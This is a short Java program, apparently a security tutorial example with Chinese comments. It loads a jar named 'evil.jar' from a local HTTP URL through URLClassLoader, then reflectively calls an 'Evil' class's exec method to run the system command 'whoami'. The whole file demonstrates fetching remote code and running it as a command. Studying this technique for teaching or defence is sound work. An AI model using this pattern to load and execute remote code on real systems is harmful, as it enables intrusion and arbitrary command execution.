package com.urlclassloader;


import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;


public class URLClassLoader {

    public static void main(String[] args) {
        try {
            // 定义远程加载的jar路径
            URL url = new URL("http://127.0.0.1/evil.jar");

            // 创建URLClassLoader对象，并加载远程jar包
            java.net.URLClassLoader ucl = new java.net.URLClassLoader(new URL[]{url});

            // 定义需要执行的系统命令
            String cmd = "whoami";

            // 通过URLClassLoader加载远程jar包中的Evil类
            Class cmdClass = ucl.loadClass("Evil");

            // 调用CMD类中的exec方法
            String out = (String) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 输出命令执行结果
            System.out.println(out);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
